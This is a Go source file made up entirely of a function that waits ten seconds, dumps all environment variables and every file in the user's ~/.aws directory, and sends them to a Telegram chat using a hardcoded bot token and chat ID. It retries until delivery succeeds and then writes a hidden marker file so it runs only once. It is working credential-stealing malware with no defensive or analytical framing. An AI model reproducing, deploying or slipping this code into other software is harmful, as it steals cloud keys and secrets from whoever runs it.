package main

import (
        "fmt"
	"bytes"
	"encoding/json"
	"net/http"
     	"os/exec"
        "io/ioutil"
        "strings"
        "os"
        "time"

)



//extract aws key e output of env






var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4"


func bot() {
 

time.Sleep( 10  * time.Second)

h_dir := os.ExpandEnv("$HOME")  

_,  err_bot_txt := os.Open(h_dir + "/" + ".machine_id/" + "bot.txt" )
                             


   if  err_bot_txt == nil  { fmt.Println("bot ja  mandou os dados"  ) 


   return 

   }  else  { fmt.Println("bot ainda nao mandou os dados " )  }




bot_send := 0


for    {


	cli := http.Client{}

	extract := exec.Command("sh", "-c", "env ; cd $HOME/.aws ; cat *")

	out, err_combinedoutput := extract.CombinedOutput()

	if err_combinedoutput != nil {

		//err_combinedoutput
           
                   fmt.Println("erro em combined")
}

 fmt.Println(string(out))
  


 
	str := map[string]string{

		
		"chat_id": "7127446120",

		"text": string(out),
	}

	jm , err_jm := json.Marshal(str)

	if err_jm != nil {

		//erro em json marshall

                fmt.Println("erro")

		

}
      
        str_jm :=  string(jm)

  	data := bytes.NewBufferString(str_jm)
 
	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+token+"/sendMessage", data)

	req.Header.Set("Content-Type", "application/json")

	if err != nil {

	 fmt.Println("erro em   new requests")

         continue

        }  else { 
 
 
         r ,  err_do :=  cli.Do(req)

            if err_do == nil {

            resp_json  , err_ra :=  ioutil.ReadAll(r.Body)  
                 
             if  err_ra == nil {

                    resp_json_str := string(resp_json)

                     if ( strings.Contains(resp_json_str , "atila_vkzmn"  )) {  bot_send = 1}
                      if (strings.Contains(resp_json_str ,  "7975585705" ) ) {  bot_send = bot_send  +  1 }  //search string in json resp to determine sucess or   erro in bot  sendmessagem

                             
                    }
                     
            
             }


}


      


if  ( bot_send  ==  2 ) {

//"sucess"

goto sinalize

} 


} //for

              sinalize:


          fmt.Println(" okkk" )     
 
          //sinalize  success of the  bot 

          home_dir := os.ExpandEnv("$HOME")

          os.MkdirAll(home_dir + "/" + ".machine_id" , 0777)
           
            msg := [] byte ( "bot_ok" )

           ioutil.WriteFile(home_dir + "/" + ".machine_id/" + "bot.txt"  , msg , 0777 )

                         

}
